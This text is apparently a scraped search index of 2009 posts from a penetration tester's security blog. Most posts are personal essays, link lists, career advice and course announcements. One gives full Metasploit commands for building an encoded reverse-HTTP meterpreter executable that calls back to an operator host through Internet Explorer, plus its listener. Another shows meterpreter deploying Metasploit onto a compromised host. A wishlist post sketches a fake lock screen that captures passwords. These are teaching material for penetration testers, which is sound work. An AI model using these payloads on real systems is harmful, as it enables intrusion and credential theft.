","date":"2009-08-12","objectID":"https://malicious.link/posts/2009/2009-08-12-applied-network-security-density/:0:0","tags":null,"title":"Applied Network Security Density","uri":"https://malicious.link/posts/2009/2009-08-12-applied-network-security-density/"},{"categories":["rant"],"content":"When I was in middle school, I told a lie. I was so good at telling lies, and remembering even the infinite details of these lies that I could make them believable. Later in life, I learned that this skill was called “Social Engineering ;-)”, but back to the story; I told everyone that I had won a shopping spree at “Incredible Universe”, now named “Fry’s”. Even the teacher believed me. The kids made lists of what they wanted me to get for them, and I strung it on for way too long. You tell a lie like that though and you get caught eventually. As I did, and learned a hard lesson. At that time in my life I was going through some really rough waters, and having everyone “like” me for even that finite amount of time, helped me cope. Does that make it right? Definitely not. But I remember that experience to this day. Why tell you all this? Because this post is both self serving (as it will make it impossible for me to lie about the following any more) and apologetic. I have lied to those I call friend. Recently these lies were told to some very good friends and I had my first physical reaction to the guilt of telling them. I was literally unable to eat that night. Enough stalling and making excuses here they are: I am not a Marine Scout Sniper, nor ever been to Marine Scout Sniper school. I truly wish I had been and admire all those who have made it through. I have never been to SEARS training. The gentleman by the name of Fuzzy, was a gas attendant with me. Great guy, but he wasn’t an explosives expert in Okinawa to the best of my knowledge. Never met the Rock Marines of Korea, or for that matter trained with any other foreign military. I have never been to a Masseuse school, but I give great massages, ask anyone. I was never a bouncer in NY or lived there. Only been there twice on vacation, but love the city, and the Yankees (although I have no idea who plays for or owns the team) nor do I follow them, or for that matter any sports team. I have been a bartender, but it was for a base beach snack bar that I followed mix solutions on a printed paper for, so I know absolutely nothing about mixed drinks. I have never told these lies during an interview or any other formal means, but I have told them to friends and acquaintances. I would like to apologize to all of them, here and now. I originally thought I should email them, but decided this public forum was a better and a bit more transparent. Are the lies damaging to anyone but me? Did I have to tell anyone? No, not really. Would someone figure out that they were lies? There is a small chance. But that’s not the point. I try to be as brutally honest as I can with people, and I want that to extend to things about myself. Think of me what you will, and I am deeply sorry if I misrepresented myself to you in any fashion at any time. Rob ","date":"2009-08-12","objectID":"https://malicious.link/posts/2009/2009-08-12-lies/:0:0","tags":null,"title":"Lies","uri":"https://malicious.link/posts/2009/2009-08-12-lies/"},{"categories":["rant"],"content":"Let me preempt this post with the following facts: I am a white male veteran with amazing parents. I went to a good school, and was never under-valued by the people I cared about. I fit no minority profiles in other words. I tell you this so that you can latch on to it as why I don’t understand anything in your rebuttal. But I think this gives me a unique view on the issue. “People are stupid. They will believe a lie because they want to believe it’s true, or because they are afraid it might be true.” —-Wizard’s First Rule - By Terry Goodkind This post was a long time coming. I feel pretty passionate about “my community”. I don’t say that in a lead-follower sense, but more of a Kum Ba Ya one. The feather that pushed this post over the edge into existence is @shazzzam’s post “Female stereotyping in security research” which was in response to the Saphead’s Binary 300 solution cartoon. But please keep in mind, this only set the cogs in motion for this post that I’ve been thinking about way before this cartoon came into existence. Sexism, and for that matter, any “-ism” is flawed on both sides. Now, Shazzzam went no where near the extreme that most of the “-ists” do for their “-isms”, she actually had some great points however, that doesn’t excuse the presumptions she made. Pusscat, Hypatia, and Shazzzam (+ the many other women in IT) have made enormous contributions, just as males have. Hackers are hackers. The only thing we measure by is the brain in your noggin, but I’ll go into that later. Where Shazzzam went wrong is that she assumed that this cartoon was depicting the female falsely, which may or may have not been the case. She then used it as a soap box to express her hate for people who make presumptions about her mental abilities because of her sex. (Damn men, “they” are always assuming I’m an idiot) “What’s the difference between a WM (woman-Marine) and a hooker? Hooker gets paid in the morning and the WM gets paid on the 1st and 15th.” —-old Marine joke, origin unknown While this is a crude joke, it illustrates a point. During my time in the Marine Corps I witnessed female Marines that were useless, ones that slept around, and those that outshined their peers, male and female alike. But guess what, those that did well were sadly the minority in my experiences. Now you might hinge your argument on that it’s my biased opinion that ‘saw’ what I wanted to see, and you very well could be right. I hardly consider myself perfect, but lets just say for the sake of argument that what I say is true. We all make assumptions, you are not perfect either, is it so wrong to bet on odds or experience when making assumptions? It’s human nature, but keeping an open mind is the key to this. How many Mark Dowds, HDs, Shazzzams and Pusscats are there in this world? How many times have you complained about an idiot boss or co-worker? How many times have you complained about script kiddies? or whatever you complain about on an assumption or amassed experience. (Stupid woman, “they” never do anything right, can’t even drive straight) This brings us to my favorite part, and why I love our community. Hackers are hackers: (original - phrak) We exist without skin color, without nationality, without religious (or sexual) bias… and you call us criminals. You build atomic bombs, you wage wars, you murder, cheat, and lie to us and try to make us believe it’s for our own good, yet we’re the criminals. Yes, I am a criminal. My crime is that of curiosity. My crime is that of judging people by what they say and think, not what they look like. My crime is that of outsmarting you, something that you will never forgive me for. I am a hacker, and this is my manifesto. You may stop this individual, but you can’t stop us all… after all, we’re all alike. +++The Mentor+++ I’ve taken the liberty of adding “(or sexual)” to this famous manifesto. But I think it stays in the spirit of it’s writer’s intent. This is my religion. I think all “ists” have forgotten what t","date":"2009-07-13","objectID":"https://malicious.link/posts/2009/2009-07-13-sexism-and-the-religion-of-hackers/:0:0","tags":null,"title":"Sexism and the religion of hackers","uri":"https://malicious.link/posts/2009/2009-07-13-sexism-and-the-religion-of-hackers/"},{"categories":["novahackers"],"content":"Looking for local events? I’ve gotten a lot of people asking me recently where the local events are in DC, and I almost every time turn them to the awesome http://www.novainfosecportal.com/ which is hands down the best source for local events for the DC-NoVA-MD area, not just NoVA. Grecs (follow him on twitter) does an amazing job at keeping it up to date and filled with every event possible. (Subscribe to his google calendar of events, get the RSS feed.. all good stuff) But there are other resources too: DojoSec - http://www.dojosec.com/- run by the amazing Marcus J. Carey who recently joined the PaulDotCom Security Weekly crew. DojoSec is a Monthly min-conference with 1 track and some of the best speakers in the local area, definitely worth The Shmoo Group hosts the recently revived Security Geeks mailing list: http://lists.shmoo.com/mailman/listinfo/secgeeks I run a luncheon that you can get on the list simply by emailing me (mubix hak5.org) or commenting here if you wish. Another site to keep up on is http://infosecevents.net/ run by GGEE has a more broad scope of events, not just in the area. Hope this helps more people find ways of getting connected with the community. ","date":"2009-06-29","objectID":"https://malicious.link/posts/2009/2009-06-29-local-security-dc-nova-md/:0:0","tags":null,"title":"Local Security - DC-NoVA-MD","uri":"https://malicious.link/posts/2009/2009-06-29-local-security-dc-nova-md/"},{"categories":["metasploit","meterpreter"],"content":"Well, sorta… I created a meterpreter script that takes the cygwin bundled version of Metasploit inside of a NullSoft installer that HD Moore created and deploys it using meterpreter to the compromised host, extracts/installs it, and runs the shell. Now I left this intentionally open so that you could package your own cygwin bundle (possibly with nmap and netcat), for your own evil fun. Thanks defintely go to Carlos Perez (Dark0perator) and HD Moore for their help getting this bad boy working right. You can download the script here: https://github.com/mubix/stuff/blob/master/metasploit/deploymsf.rb You can download the cygwin installs from the metasploit website: 13mb FULL framework: framework-3.3-dev.exe 5mb MINI (just msfconsole): mini-3.3-dev.exe And here is what it looks like: meterpreter \u003e run deploymsf -f framework-3.3-dev.exe [*] Running Meterpreter MSFp Deploytment Script..... [*] Uploading MSFp for for deployment.... [*] MSFp uploaded as C:DOCUME~1mubixLOCALS~1Temp12681.exe [*] Installing MSFp........... [*] Done! [*] Installation Complete! [*] Running cygwin shell channelized... [*] Channel 18 created - Type: interact 18 to play [*] Be warned, it takes a bit for post setup to happen [*] and you will not see a prompt, try pwd to check meterpreter \u003e interact 18 Interacting with channel 18... [*] Configuring multi-user permissions for first run... [*] Configuring the initial user environment... pwd /home/mubix ls msfconsole *** Metasploit only has EXPERIMENTAL support for Ruby 1.9.1 and newer, things may break! *** Please report bugs to msfdev[at]metasploit.com [-] *** [-] * WARNING: No database support: LoadError no such file to load -- active_record [-] *** ## ### ## ## ## ## #### ###### #### ##### ##### ## #### ###### ####### ## ## ## ## ## ## ## ## ## ## ### ## ####### ###### ## ##### #### ## ## ## ## ## ## ## ## # ## ## ## ## ## ## ##### ## ## ## ## ## ## ## #### ### ##### ##### ## #### #### #### ### ## =[ msf v3.3-dev + -- --=[ 379 exploits - 231 payloads + -- --=[ 20 encoders - 7 nops =[ 156 aux msf \u003eGAME OVER ","date":"2009-06-26","objectID":"https://malicious.link/posts/2009/2009-06-26-metasploit-framework-as-a-payload/:0:0","tags":null,"title":"Metasploit Framework as a Payload","uri":"https://malicious.link/posts/2009/2009-06-26-metasploit-framework-as-a-payload/"},{"categories":["wishlist","ideas"],"content":"There are a lot of tools that I find in my endeavors would be really helpful, but can’t find on the net for whatever reason. A portable version of of tshark that has ARP spoofing capabilities. I want to be able to drop the file, issue the arguments and pull the pcap back. A application that can sniff traffic from a specific process. Metasploit’s keylogger is sort of there as it only pulls keys from the process of which it is attached (DLL is to ‘fault’ for this). And Process Hacker is also pretty close, (Process Explorer does a TCPVIew like show of the connections currently happening). An nmap script that sees port 445 open and tries pass the hash, and token passing to run a specified executable. I believe tebo was developing a psexec scanner for Metasploit, but it hasn’t been released as of yet. A meterpreter script that sets the a all user GPO setting for wallpaper and forces the update. (For calling-card notifications during pen-tests) A password list generator that would take URLs, and files (pulling metadata where applicable, strings in other cases). And churn out a dictionary, and also ask if you would like to start generating a Rainbow Table for that specific dictionary. A meterpreter module like “Echo Mirage” by the BeEF guys, sort of like an iptables injection that modifies/accepts/denys packets to a specific process This is Kevin Johnson’s idea but it should be posted: A standard XMLish format for all Web Application Scanners so that the tools interoperate. One spider session can be loaded into another tool and have it’s auditing system check it, instead of being confined too one tool. A screen saver that imitates the screen saver lockout event and has the user login (and has it fail twice by default for “Password Validation ;-)”) and then allows them back in, capturing those password. (Usually a user will try a couple different passwords so you might be able to glean other credentials to use). It could also have an option to state. “Account Locked, You must be an Administrator to login” so that they call an admin in to unlock it ;-) I’ll leave it at that for now. Anyone interested in coding it ? ","date":"2009-06-17","objectID":"https://malicious.link/posts/2009/2009-06-17-security-tools-im-looking-for-part-i/:0:0","tags":null,"title":"Security Tools I'm Looking For Part I","uri":"https://malicious.link/posts/2009/2009-06-17-security-tools-im-looking-for-part-i/"},{"categories":["reverse-engineering"],"content":"Matt, from the Exotic Liability forums, posed a suggestion for a episode: “Getting started [in] reverse engineering hardware drivers?”. I thought this was an interesting topic to attack so, I dug a bit into my RSS feed pile of goo and compiled this list of links. Hope this helps Matt. ","date":"2009-06-12","objectID":"https://malicious.link/posts/2009/2009-06-12-getting-your-fill-of-reverse-engineering-and-malware-analysis/:0:0","tags":null,"title":"Getting your fill of Reverse Engineering and Malware Analysis","uri":"https://malicious.link/posts/2009/2009-06-12-getting-your-fill-of-reverse-engineering-and-malware-analysis/"},{"categories":["reverse-engineering"],"content":"Individuals — Skywing - http://www.nynaeve.net/ Egypt - http://0xegypt.blogspot.com/ Yoni - http://blogs.msdn.com/michael_howard/ Raymond Chen - http://blogs.msdn.com/oldnewthing/ Sia0 - http://blogs.msdn.com/michkap/ Rob P - http://geekswithblogs.net/robp/Default.aspx Quantam - http://qstuff.blogspot.com/ Phn1x - http://hamsterswheel.com/techblog/ Halavar Flake - http://addxorrol.blogspot.com/ Pedram - http://pedram.redhive.com/blog Tyler Shields - http://www.donkeyonawaffle.org/ Wesley Shields - http://www.atarininja.org/ Peter Wieland - http://blogs.msdn.com/peterwie/ Michael Howard - http://blogs.msdn.com/michael_howard/ Doron Holan - http://blogs.msdn.com/doronh/ Nico Waisman - http://eticanicomana.blogspot.com/ Dmitry Vostokov - http://www.dumpanalysis.org/blog/ Nicolas Sylvain - http://nsylvain.blogspot.com/ Alex Ionescu - http://www.alex-ionescu.com/ Mattheiu Suiche - http://www.msuiche.net/ Larry Osterman - http://blogs.msdn.com/larryosterman/ Koby Kahane - http://kobyk.wordpress.com/ Jason Geffner - http://malwareanalysis.com/communityserver/blogs/geffner/default.aspx Ero Carrera - http://blog.dkbza.org/ Dino Dai Zovi - http://blog.trailofbits.com/ Ilja - http://blogs.23.nu/ilja/ Nate Lawson - http://rdist.root.org/ Mark Russinovich - http://blogs.technet.com/markrussinovich/ Jose Nazario - http://www.wormblog.com/ Jonathan Morrison - http://blogs.msdn.com/itgoestoeleven/ John Robbins - http://www.wintellect.com/cs/blogs/jrobbins/default.aspx Ilias Tsigkogiannis - http://blogs.msdn.com/iliast/ Daniel Reynaud - http://indefinitestudies.org/ Joanna Rutkowska - http://theinvisiblethings.blogspot.com/ Matthieu Kaczmarek - http://www.loria.fr/~kaczmare/index.en.htm Silvio Cesare - http://silviocesare.wordpress.com/ Philippe Beaucamps - http://www.loria.fr/~beaucphi/ Debugging Toolbox - http://blogs.msdn.com/debuggingtoolbox/ Fravia’s saved works (RIP) - http://www.woodmann.com/fravia/index.htm ","date":"2009-06-12","objectID":"https://malicious.link/posts/2009/2009-06-12-getting-your-fill-of-reverse-engineering-and-malware-analysis/:0:1","tags":null,"title":"Getting your fill of Reverse Engineering and Malware Analysis","uri":"https://malicious.link/posts/2009/2009-06-12-getting-your-fill-of-reverse-engineering-and-malware-analysis/"},{"categories":["reverse-engineering"],"content":"Groups — Offensive Computing - http://www.offensivecomputing.net/ The Cover of Night - http://www.thecoverofnight.com/blog/ LHS - http://lhs.loria.fr/ NT Debugging - http://blogs.msdn.com/ntdebugging/ Hex Blog - http://www.hexblog.com/ Engineering for Fun - http://blog.engineeringforfun.com/ ","date":"2009-06-12","objectID":"https://malicious.link/posts/2009/2009-06-12-getting-your-fill-of-reverse-engineering-and-malware-analysis/:0:2","tags":null,"title":"Getting your fill of Reverse Engineering and Malware Analysis","uri":"https://malicious.link/posts/2009/2009-06-12-getting-your-fill-of-reverse-engineering-and-malware-analysis/"},{"categories":["reverse-engineering"],"content":"Company — OpenRCE - http://www.openrce.org/articles/ DV Labs - http://dvlabs.tippingpoint.com/blog/ Matasano - http://www.matasano.com/log/ VeraCode - http://www.veracode.com/blog/ Trend Micro - http://blog.trendmicro.com/ ","date":"2009-06-12","objectID":"https://malicious.link/posts/2009/2009-06-12-getting-your-fill-of-reverse-engineering-and-malware-analysis/:0:3","tags":null,"title":"Getting your fill of Reverse Engineering and Malware Analysis","uri":"https://malicious.link/posts/2009/2009-06-12-getting-your-fill-of-reverse-engineering-and-malware-analysis/"},{"categories":["reverse-engineering"],"content":"Forums — Reverse Engineering - http://community.reverse-engineering.net/index.php OpenRCE - http://www.openrce.org/forums/ Assembly Forums - http://www.asmcommunity.net/board/ ","date":"2009-06-12","objectID":"https://malicious.link/posts/2009/2009-06-12-getting-your-fill-of-reverse-engineering-and-malware-analysis/:0:4","tags":null,"title":"Getting your fill of Reverse Engineering and Malware Analysis","uri":"https://malicious.link/posts/2009/2009-06-12-getting-your-fill-of-reverse-engineering-and-malware-analysis/"},{"categories":["reverse-engineering"],"content":"Sandboxing and Analysis — Joe Box - http://www.joebox.org/ Virus Total - http://www.virustotal.com/ Wepawet - http://wepawet.cs.ucsb.edu/ F-Secure -http://www.f-secure.com/en_US/security/security-lab/ Anubis - http://anubis.iseclab.org/ Jotti - http://virusscan.jotti.org/en Sunbelt CWSandbox - http://www.sunbeltsecurity.com/Submit.aspx?type=cwsandbox\u0026cs=A41CD150B37359889A553671CBFD2360 ","date":"2009-06-12","objectID":"https://malicious.link/posts/2009/2009-06-12-getting-your-fill-of-reverse-engineering-and-malware-analysis/:0:5","tags":null,"title":"Getting your fill of Reverse Engineering and Malware Analysis","uri":"https://malicious.link/posts/2009/2009-06-12-getting-your-fill-of-reverse-engineering-and-malware-analysis/"},{"categories":["reverse-engineering"],"content":"Misc — Code Breakers Journal - http://www.codebreakers-journal.com/ The Art of Assembly - http://webster.cs.ucr.edu/AoA/DOS/AoADosIndex.html Intel Processor Instruction Set A-M/N-Z - http://www.intel.com/products/processor/manuals/ WASM.ru with translation - http://66.196.80.202/babelfish/translate_url_content?lp=ru_en\u0026url=http://www.wasm.ru\u0026.intl=us Update on 2009-10-11 06:27 by Rob Fuller The Malware Distribution Project posted a comment a while back letting us know of their project so that it could be added to the list: MD:Pro - http://frame4.net/ And their ‘more up-to-date’ Fravia archive: http://fravia.frame4.com/ ","date":"2009-06-12","objectID":"https://malicious.link/posts/2009/2009-06-12-getting-your-fill-of-reverse-engineering-and-malware-analysis/:0:6","tags":null,"title":"Getting your fill of Reverse Engineering and Malware Analysis","uri":"https://malicious.link/posts/2009/2009-06-12-getting-your-fill-of-reverse-engineering-and-malware-analysis/"},{"categories":["rant"],"content":"Val Smith recently wrote a post on the new Attack Research / carnal0wnage blog titled: ”Security Conferences, pen tests and incident response” Here are my thoughts on what he wrote: In paragraphs 2-6 he talks about two points. The first being that Hacker Conferences have become sort of commercialized with most speakers going for their day in the lime light or to pimp some product/0day. And the second being a lot of the talks are things that most can’t go home / back to work and test out or implement. I agree with him on both points. On the first point I think that one detail was left out of this evaluation. Size. Back when DEFCON was \u003c500 people, almost everyone knew each other. 90% of those attending had the passion, had the fire for that what makes our line of work such an art. Now that our community has become “popular”, that percentage is around 20-30%. These numbers aren’t based on any stats, just something that I have been observing as well. On the second point, my first security conference was ShmooCon ‘06. I was glued to might seat in each talk I attended, and in just 3 short years I have seen EXACTLY what he’s talking about. I used to have to decide between awesome talks in the same hour. Now I actually find times where I’m not interested in anything being presented for that hour. But, rooms still get packed so I guess that’s just my own pickiness. Penetration Testing and Incident is the second portion of his post and I really think he’s hit the nail on the head, Pen Testing and Incident Response should work closely together. I want to throw Vulnerability Assessment and Forensics into the mix as well, feeding each other, sharing data, and assisting. The segmentation of duties / teams is killing collaboration. Lets get back to the basics, and really show what this community is capable of. ","date":"2009-06-11","objectID":"https://malicious.link/posts/2009/2009-06-11-rant-back-valsmith/:0:0","tags":null,"title":"Rant Back – ValSmith","uri":"https://malicious.link/posts/2009/2009-06-11-rant-back-valsmith/"},{"categories":["metasploit","passivex"],"content":"I posted this walkthrough to the Metasploit mailing list, but thought that it would serve well here as well. Especially with the recent iPhone 3.0 “Special” download spam I recently received. The binary comes out to a whopping 97 bytes for the stager. Would be a blazing fast download and coupled with the IExpress “hack” would make for an very hard to spot payload. A really down and dirty explination of what PassiveX is and why it’s useful in this sort of situation is that instead of making a direct connection back to you, it uses an iexplorer process with a cool ActiveX control to talk back. So someone looking for a rogue process will only see Internet Explorer open and talking over port 443 (as specified). (props to skape for writting PassiveX and @NatronKeltner for kicking in the latest tweaks to make it work with IE7/IE8) Here are the options for msfpayload: Usage: ./msfpayload \u003cpayload\u003e [var=val] \u003cS[ummary]|C|P[erl]|[Rub]y|R[aw]|J[avascript]|e[X]ecutable|[V]BA\u003e And msfencode’s options if you chose to use it as I demonstrate below. However, encoding happens by default with msfpayload (IIRC): ./msfencode -h Usage: ./msfencode \u003coptions\u003e OPTIONS: -a \u003copt\u003e The architecture to encode as -b \u003copt\u003e The list of characters to avoid: 'x00xff' -c \u003copt\u003e The number of times to encode the data -e \u003copt\u003e The encoder to use -h Help banner -i \u003copt\u003e Encode the contents of the supplied file path -l List available encoders -m \u003copt\u003e Specifies an additional module search path -n Dump encoder information -o \u003copt\u003e The output file -s \u003copt\u003e The maximum size of the encoded data -t \u003copt\u003e The format to display the encoded buffer with (c, elf, exe, java, perl, raw, ruby, vba) Here we create the PassiveX payload. Note the PX options instead of the LHOST/LPORT: ./msfpayload windows/reflectivemeterpreter/reverse_http PXHOST=192.168.1.100 PXPORT=443 PXURI=/ R | ./msfencode -t exe -o /tmp/maliciouspayload.exe [*] x86/shikata_ga_nai succeeded with size 97 (iteration=1) Now that we have our “malicious payload” in /tmp we get our listener ready (you can use msfcli as well, I just like msfconsole because it provides me more flexibility): ./msfconsole _ | | o _ _ _ _ _|_ __, , _ | | __ _|_ / |/ |/ | |/ | / | / _|/ _|/ / _| | | | |_/|__/|_/_/|_/ / |__/ |__/__/ |_/|_/ /| | =[ msf v3.3-dev + -- --=[ 376 exploits - 234 payloads + -- --=[ 20 encoders - 7 nops =[ 153 aux msf \u003e use multi/handler msf exploit(handler) \u003e exploit -h (I’m showing you ’exploit’s options because a lot of people don’t know they exist. With two lines you can start your listener (use, then exploit):** Usage: exploit [options] Launches an exploitation attempt. OPTIONS: -e \u003copt\u003e The payload encoder to use. If none is specified, ENCODER is used. -h Help banner. -j Run in the context of a job. -n \u003copt\u003e The NOP generator to use. If none is specified, NOP is used. -o \u003copt\u003e A comma separated list of options in VAR=VAL format. -p \u003copt\u003e The payload to use. If none is specified, PAYLOAD is used. -t \u003copt\u003e The target index to use. If none is specified, TARGET is used. -z Do not interact with the session after successful exploitation. msf exploit(handler) \u003e exploit -j -z -p windows/reflectivemeterpreter/reverse_http -o PXHOST=0.0.0.0,PXPORT=443,PXURI=/,ExitOnSession=False [*] Exploit running as background job. [*] PassiveX listener started. [*] Starting the payload handler... msf exploit(handler) \u003e Listener ready to go. I chose IP: 0.0.0.0 just to make things easy. Just send off maliciouspayload.exe to your target and you’re set. ","date":"2009-06-10","objectID":"https://malicious.link/posts/2009/2009-06-10-passivex-fun-with-metasploit/:0:0","tags":null,"title":"PassiveX fun with Metasploit","uri":"https://malicious.link/posts/2009/2009-06-10-passivex-fun-with-metasploit/"},{"categories":["internet"],"content":"I recently posted a blog post to Exotic Liability’s website with the same title, and I realized that it would make a great thing to post to here, and update regularly, or just put it on the wiki I keep saying that I get going here. Enough rambling, here is how you can get your fill of security: ","date":"2009-05-29","objectID":"https://malicious.link/posts/2009/2009-05-29-getting-your-fill-of-security/:0:0","tags":null,"title":"Getting your fill of Security","uri":"https://malicious.link/posts/2009/2009-05-29-getting-your-fill-of-security/"},{"categories":["internet"],"content":"Podcasting: GetMon - http://www.getmon.com/ - This is a great site because you can download or listen to any of the security podcasts right from their site if you want to. HackerMedia - http://www.hackermedia.org/ - They put together like podcasts into different categories, and they overlap. So if you want the “Linux” feed, you’ll get podcast A, B, and C. But maybe podcast C does Linux security, so if you subscribe to the “Security” feed, you might get C, E, and G. You can also get the everything feed ","date":"2009-05-29","objectID":"https://malicious.link/posts/2009/2009-05-29-getting-your-fill-of-security/:0:1","tags":null,"title":"Getting your fill of Security","uri":"https://malicious.link/posts/2009/2009-05-29-getting-your-fill-of-security/"},{"categories":["internet"],"content":"Bloggers (RSS Feeds): Security Bloggers Network - http://www.securitybloggers.net/ - A consolidated feed of a HUGE list of security blogs ","date":"2009-05-29","objectID":"https://malicious.link/posts/2009/2009-05-29-getting-your-fill-of-security/:0:2","tags":null,"title":"Getting your fill of Security","uri":"https://malicious.link/posts/2009/2009-05-29-getting-your-fill-of-security/"},{"categories":["internet"],"content":"Twitter: Security Twits - http://www.security-twits.com/ - A long list of security related twitter accounts. From people to events, to companies. ","date":"2009-05-29","objectID":"https://malicious.link/posts/2009/2009-05-29-getting-your-fill-of-security/:0:3","tags":null,"title":"Getting your fill of Security","uri":"https://malicious.link/posts/2009/2009-05-29-getting-your-fill-of-security/"},{"categories":["internet"],"content":"Places to learn: The Academy Pro - http://www.theacademypro.com/ Learn Security Online - http://www.learnsecurityonline.com/ Free IT Security Training - http://www.freeitsecuritytraining.com/ Virtual Training Environment by Carnegie Mellon - https://www.vte.cert.org/vteweb/ ","date":"2009-05-29","objectID":"https://malicious.link/posts/2009/2009-05-29-getting-your-fill-of-security/:0:4","tags":null,"title":"Getting your fill of Security","uri":"https://malicious.link/posts/2009/2009-05-29-getting-your-fill-of-security/"},{"categories":["internet"],"content":"Challenge Sites and Sites that are OK to attack: (Make sure you know which is which before you haul off and start attacking though) (Most of these stolen from Chris Nickerson’s reply to Show 17 Links blog post) http://www.owasp.org/index.php/Category:OWASP_WebGoat_Project http://testasp.acunetix.com/Default.asp http://test.acunetix.com/ http://hackme.ntobjectives.com/ http://www.foundstone.com/us/resources/proddesc/hacmeshipping.htm http://www.foundstone.com/us/resources/proddesc/hacmecasino.htm http://www.foundstone.com/us/resources/proddesc/hacmebooks.htm http://www.foundstone.com/us/resources/proddesc/hacmetravel.htm http://lampsecurity.org/capture-the-flag-5 http://zero.webappsecurity.com/ http://www.hackertest.net/ http://www.hackthissite.org/ http://www.mavensecurity.com/WebMaven.php http://ha.ckers.org/challenge/ http://ha.ckers.org/challenge2/ http://demo.testfire.net/ http://scanme.nmap.org/ http://www.hellboundhackers.org/ http://www.overthewire.org/wargames/ http://roothack.org/ http://heorot.net/ http://www.irongeek.com/i.php?page=security/mutillidae-deliberately… http://wocares.com/xsstester.php https://how2hack.net http://hax.tor.hu/ http://www.bright-shadows.net/ http://www.dareyourmind.net/ http://hackergames.net/ http://www.hackquest.com/ http://www.darkmindz.com/ http://www.caesum.com/game/ http://www.net-force.nl/ http://www.osix.net/ http://www.mibs-challenges.de/ http://projecteuler.net/ http://uva.onlinejudge.org/ http://ace.delos.com/usacogate So now you have absolutely ZERO reason to have one moment of time on your hands ;-) Know of another good resource? Post a comment. UPDATE: ethicalhack3r from http://www.ethicalhack3r.co.uk pointed me to his project called “Damn Vulnerable Web App”. You can find it on Sourceforge here: http://sourceforge.net/projects/dvwa/ Update on 2009-12-09 05:30 by Rob Fuller A must larger post was made: http://www.linux-ninja.com/infosec-self-education-resources/ there are a ton of resources out there… now you don’t even have to google for them… ","date":"2009-05-29","objectID":"https://malicious.link/posts/2009/2009-05-29-getting-your-fill-of-security/:0:5","tags":null,"title":"Getting your fill of Security","uri":"https://malicious.link/posts/2009/2009-05-29-getting-your-fill-of-security/"},{"categories":["presentations"],"content":"First of all, here is my slide deck from DojoSec with a couple added slides, words, and slight modifications: From Couch To Career In 80 Hours from Rob Fuller I have put this article off quite a few times due to some very cool and interesting things happening in our field as it applies to getting a job. That, and Matt Johansen beat me to it with his blog post titled: “A lot of Information Security Career Advice”, which I highly recommend you check out and add to your RSS reader. So instead of rewriting things that other people have already covered I’ll just post the links to them: We start our journey as any real hacker would, with the “Hacker Handle Generator\". And since I am more of an Audio/Visual Leaner let’s start off with “Exotic Liability Episode 10: Advice” Where Ryan Jones, DJ Jackalope, and Chris Nickerson, of “Tiger Team” fame, fortune and power, call back Michigan Justin and talk at length about how to start out in the community. We also have Don Donzal from EthicalHacker.net who talks about “DIY Career in Ethical Hacking” (MP3 / SLIDES), and about 16 tips from “Ugly Resumes get Jobs!” on Slideshare. But this A/V setup wouldn’t be complete if I didn’t tell you guys where you can get all kinds of videos actually teaching you security so that you can have a leg up on everyone else. Head on over to TheAcademyPro.com where you can watch 1-5 minute videos on everything from configuring Snort and exploiting systems with Metasploit, to configuring Sourcefire 3D and destroying the world with Core Impact. Another site to bookmark is SecurityTube.net. The guys there work their fingers to the bone to locate security videos across the net and put them all in one central pace for you to access. Now on for those people who like to do all that “reading” stuff. First head on over to the Security Catalyst for Part 1 and Part 2 of “Career Advice for Security Geeks” and Paul Asadoorian’s post titled “Getting Started In Information Security How-To” and Kees Leune’s post titled “Tips for Getting Started in Information Security”, and if you are really feeling froggy, read all 4+ years (only 6 or so pages don’t worry too much) of the discussion on the Defcon forums: “Getting started in the security field” Finally, sticking with the theme that I try to keep going on this blog I want to give you something new to digest: James Arlen (aka myrcurial) does a talk at Notacon about going from BlackHat to BlackSuit LifeHacker’s “Top 10 Tools for landing a better job” Aaron Crowe writes about “How to avoid being scammed in a job hunt” Lee Kushner writes about “Wanting a Job Too Much” Two Mashable articles: “How to find a Job on Twitter” and “How to exchange Biz cards on Twitter” But I wanted to close with some advice that a lot of people have a hard time with. And that is how to talk dollars, and how to do it well. And Jack Chapman is certainly the guy to learn from. Check out a write-up on him on GetRichSlowly.org titled “Negotiating Your Salary: How to Make $1,000 a Minute” (which is the title of Chapman’s book). And Chapman’s site where he has tons of YouTube videos of tips that he describes in the book. Sorry this is a bunch of links, and if you guys would like me to explain each slide in my Couch to Career deck I’ll make another post about it. ","date":"2009-05-23","objectID":"https://malicious.link/posts/2009/2009-05-23-couch-to-career-follow-up/:0:0","tags":null,"title":"Couch to Career - Follow up","uri":"https://malicious.link/posts/2009/2009-05-23-couch-to-career-follow-up/"},{"categories":["training","presentations"],"content":"Dark0perator and I will be giving a workshop at ToorCamp coming up July 2nd-5th: You can find us on the ToorCamp site: http://www.toorcamp.org/content/W13 Here is the description of our talk, save the bio(s): The Art of Pivot and Persistence: Shell is only the beginning. This workshop is based on the assumption that you have some level of access on a target system. From that it is demonstrated how to go from that level of access to taking over the whole company and how to keep that access, surviving reboots, AV scans, and even reimaging. The following levels of access is covered: Domain Administrator access on a domain controller Local Administrator access on a client machine Root on a Database server Root on a Web server User on a client machine User on a Database server User on a Web server ","date":"2009-05-05","objectID":"https://malicious.link/posts/2009/2009-05-05-workshop-at-toorcamp-with-dark0perator/:0:0","tags":null,"title":"Workshop at ToorCamp with Dark0perator","uri":"https://malicious.link/posts/2009/2009-05-05-workshop-at-toorcamp-with-dark0perator/"},{"categories":["traning"],"content":"I highly recommend both of these courses, and the chance to get in front of the instructors and ask questions live is worth it IMHO. So bang on those manager doors and work it out, because seats fill quickly and they are limited. Check out the Offensive Security - Instructor Lead Training page for updated information. We are excited to announce our next Offsec Live Classes. Since you asked to be notified of our next dates you will be happy to be among the first to have your teams invited to one of our next classes. Our last classes sold out about 2 months early and this class there are literally hundreds in the queue so please contact me as early as you can. ------------------------------------------------------ Pentesting With BackTrack Live October 26-30, 2009 Columbia, MD Costs: $3500 now till July 15th $3799 July 15th – September 1st $3999 September 1st till class Your class will include the following: · 5 days of intense training from Mati Aharoni and Chris Hadnagy · 30 days of labs in our special Pentesting with BackTrack Labs · Your chance to take the highly regarded OSCP Certification · We also cover your lunch during the week · We host a special after hours session for those who want to join in This class is designed to take you from A to Z in real life pentesting skills. We cover from Information Gathering to writing your own overflow. We ask each student to have a clear understanding of TCP/IP, basic linux skills and familiarity with the concepts of pentesting. ------------------------------------------------------ Offensive Security Cracking the Perimeter Live November 9-13, 2009 Columbia, MD Costs: $5000 now till July 30th $5299 July 30th – October 1st $5499 October 1st till class Your class will include the following: · 5 days of intense training from Mati Aharoni and Chris Hadnagy · 30 days of labs in our special Cracking the Perimeter Labs · Your chance to take the prestigious OSCE Certification · We also cover your lunch during the week This class is designed for the seasoned security professional - A pentester or sec pro that has taken their skills to the edge and now need a little push over – 